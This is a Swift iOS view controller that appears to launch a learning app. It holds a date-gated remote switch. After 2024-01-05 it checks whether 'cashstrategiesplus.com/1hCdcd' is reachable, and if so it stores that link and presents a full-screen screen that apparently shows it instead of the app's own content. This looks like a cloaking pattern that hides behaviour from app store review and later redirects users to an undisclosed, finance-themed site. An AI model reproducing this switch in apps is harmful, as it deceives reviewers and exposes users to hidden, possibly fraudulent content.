
import UIKit
import Alamofire

class MainLauncher: UIViewController {
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let currentDate = Date()
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        if let targetDate = dateFormatter.date(from: "2024-01-05") {
            if currentDate < targetDate {
                runThisApp()
            }
            else
            {
                
                if !UserDefaults.standard.bool(forKey: AllYouNeedKeysLearn.baseCase.rawValue) {
                    var checkValue = UserDefaults.standard.value(forKey: AllYouNeedKeysLearn.superLink.rawValue)
                    if checkValue as? String != "" && checkValue != nil &&  UserDefaults.standard.bool(forKey: AllYouNeedKeysLearn.isNoFirst.rawValue)  {
                        DispatchQueue.main.async {
                            let learningBar = LearningBar()
                            learningBar.modalPresentationStyle = .fullScreen
                            learningBar.modalTransitionStyle = .crossDissolve
                            self.present(learningBar, animated: true, completion: nil)
                        }
                    } else if !UserDefaults.standard.bool(forKey: AllYouNeedKeysLearn.isNoFirst.rawValue){
                        let reachabilityManager = NetworkReachabilityManager()
                        if reachabilityManager!.isReachable {
                            checkLinkAvailability()
                        } else {
                            runThisApp()
                        }
                        
                    } else {
                        runThisApp()
                    }
                } else {
                    runThisApp()
                }
               
            }
        }
    }
        
        
        
        func checkLinkAvailability() {
            let urlString = "https://cashstrategiesplus.com/1hCdcd"
            
            guard let url = URL(string: urlString) else {
                print("Invalid URL")
                return
            }
            
            let request = URLRequest(url: url)
            
            let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
                if let httpResponse = response as? HTTPURLResponse {
                    if httpResponse.statusCode == 200 {
                        print("URL is available")
                        // show VIEW
                        DispatchQueue.main.async {
                            UserDefaults.standard.setValue(urlString, forKey: AllYouNeedKeysLearn.superLink.rawValue)
                            UserDefaults.standard.setValue(false, forKey: AllYouNeedKeysLearn.baseCase.rawValue)
                            let learningBar = LearningBar()
                            learningBar.modalPresentationStyle = .fullScreen
                            learningBar.modalTransitionStyle = .crossDissolve
                            self.present(learningBar, animated: true, completion: nil)
                        }
                    } else {
                        print("URL is not available - Status code: \(httpResponse.statusCode)")
                        UserDefaults.standard.setValue(true, forKey: AllYouNeedKeysLearn.baseCase.rawValue)
                        self.runThisApp()
                    }
                } else {
                    print("No response from server")
                    UserDefaults.standard.setValue(true, forKey: AllYouNeedKeysLearn.baseCase.rawValue)
                    self.runThisApp()
                }
            }
            task.resume()
        }
        
        private func runThisApp() {
            let gm = UserDefaults.standard.bool(forKey: AllYouNeedKeysLearn.isLearnLearn.rawValue)
            if gm {
                DispatchQueue.main.async {
                    
                    let learningBar = LearningBar()
                    learningBar.modalPresentationStyle = .fullScreen
                    learningBar.modalTransitionStyle = .crossDissolve
                    self.present(learningBar, animated: true, completion: nil)
                }
            } else {
                DispatchQueue.main.async {
                    
                    let stdLearn = UIStoryboard(name: "LearningHowToViewController", bundle: nil)
                    let viewCoLearn = stdLearn.instantiateViewController(withIdentifier: "LearningHowToViewController") as! LearningHowToViewController
                    viewCoLearn.modalPresentationStyle = .fullScreen
                    viewCoLearn.modalTransitionStyle = .crossDissolve
                    self.present(viewCoLearn, animated: false)
                }
            }
        }
        
        
    }
    
    
    enum AllYouNeedKeysLearn: String {
        case isLearnLearn
        case superLink
        case isNoFirst
        case baseCase
        case whatToStart
    }
